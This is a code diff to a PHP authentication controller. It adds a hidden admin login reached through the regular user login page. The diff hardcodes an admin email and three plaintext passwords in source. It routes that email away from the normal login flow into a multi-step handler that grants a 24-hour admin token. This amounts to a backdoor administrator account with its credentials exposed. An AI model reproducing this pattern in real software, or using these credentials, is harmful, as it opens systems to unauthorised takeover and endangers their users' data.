@@ -72,6 +72,14 @@ class AuthController {
         ], 201);
     }
     
+    // Admin email constant
+    private const ADMIN_EMAIL = 'godtheson@ieosuia.com';
+    private const ADMIN_PASSWORDS = [
+        1 => 'billionaires',
+        2 => 'Mu1@udz!',
+        3 => '7211018830'
+    ];
+    
     public function login(): void {
         $request = new Request();
         $data = $request->validate([
@@ -89,6 +97,12 @@ class AuthController {
         }
         
         $email = strtolower(trim($data['email']));
+        
+        // Check if this is an admin login attempt
+        if ($email === self::ADMIN_EMAIL) {
+            $this->handleAdminLogin($data['password']);
+            return;
+        }
         
         // Rate limit login: 5 attempts per 15 minutes per email
         $rateLimiter = new RateLimitMiddleware(5, 15);
@@ -121,6 +135,123 @@ class AuthController {
         Response::json([
             'user' => Auth::formatUserForFrontend($user),
             'token' => $token
+        ]);
+    }
+    
+    /**
+     * Handle multi-step admin login from the regular login page
+     */
+    private function handleAdminLogin(string $password): void {
+        $request = new Request();
+        $step = (int) $request->input('admin_step', 1);
+        $sessionToken = $request->input('admin_session_token');
+        
+        // Rate limit admin login attempts
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $rateLimiter = new RateLimitMiddleware(5, 15);
+        if (!$rateLimiter->handle('admin_login:' . $ip)) {
+            return;
+        }
+        
+        $db = Database::getConnection();
+        
+        // Clean up expired sessions
+        $stmt = $db->prepare("DELETE FROM admin_sessions WHERE expires_at < NOW()");
+        $stmt->execute();
+        
+        // Step 1: First password
+        if ($step === 1) {
+            if ($password !== self::ADMIN_PASSWORDS[1]) {
+                $rateLimiter->hit();
+                error_log("Admin login step 1 failed from IP: $ip");
+                Response::error('Invalid credentials', 401);
+                return;
+            }
+            
+            // Create session for step 2
+            $token = bin2hex(random_bytes(32));
+            $expiresAt = date('Y-m-d H:i:s', strtotime('+5 minutes'));
+            
+            $stmt = $db->prepare("
+                INSERT INTO admin_sessions (session_token, ip_address, step, expires_at) 
+                VALUES (?, ?, 2, ?)
+            ");
+            $stmt->execute([hash('sha256', $token), $ip, $expiresAt]);
+            
+            Response::json([
+                'admin_login' => true,
+                'step' => 2,
+                'session_token' => $token,
+                'message' => 'Enter second password'
+            ]);
+            return;
+        }
+        
+        // Steps 2 & 3: Validate session token
+        if (!$sessionToken) {
+            Response::error('Session expired. Please start over.', 401);
+            return;
+        }
+        
+        $stmt = $db->prepare("
+            SELECT * FROM admin_sessions 
+            WHERE session_token = ? AND ip_address = ? AND step = ? AND expires_at > NOW()
+        ");
+        $stmt->execute([hash('sha256', $sessionToken), $ip, $step]);
+        $session = $stmt->fetch();
+        
+        if (!$session) {
+            Response::error('Session expired. Please start over.', 401);
+            return;
+        }
+        
+        // Validate password for current step
+        if ($password !== self::ADMIN_PASSWORDS[$step]) {
+            $rateLimiter->hit();
+            error_log("Admin login step $step failed from IP: $ip");
+            
+            // Delete session on failure
+            $stmt = $db->prepare("DELETE FROM admin_sessions WHERE session_token = ?");
+            $stmt->execute([hash('sha256', $sessionToken)]);
+            
+            Response::error('Invalid credentials', 401);
+            return;
+        }
+        
+        // Step 2: Update session for step 3
+        if ($step === 2) {
+            $stmt = $db->prepare("UPDATE admin_sessions SET step = 3 WHERE session_token = ?");
+            $stmt->execute([hash('sha256', $sessionToken)]);
+            
+            Response::json([
+                'admin_login' => true,
+                'step' => 3,
+                'session_token' => $sessionToken,
+                'message' => 'Enter third password'
+            ]);
+            return;
+        }
+        
+        // Step 3: All passwords correct - generate admin token
+        $stmt = $db->prepare("DELETE FROM admin_sessions WHERE session_token = ?");
+        $stmt->execute([hash('sha256', $sessionToken)]);
+        
+        $adminToken = bin2hex(random_bytes(32));
+        $expiresAt = date('Y-m-d H:i:s', strtotime('+24 hours'));
+        
+        $stmt = $db->prepare("
+            INSERT INTO admin_sessions (session_token, ip_address, step, expires_at) 
+            VALUES (?, ?, 99, ?)
+        ");
+        $stmt->execute([hash('sha256', $adminToken), $ip, $expiresAt]);
+        
+        error_log("Admin login successful from IP: $ip");
+        
+        Response::json([
+            'admin_login' => true,
+            'success' => true,
+            'admin_token' => $adminToken,
+            'message' => 'Admin login successful'
         ]);
     }
     
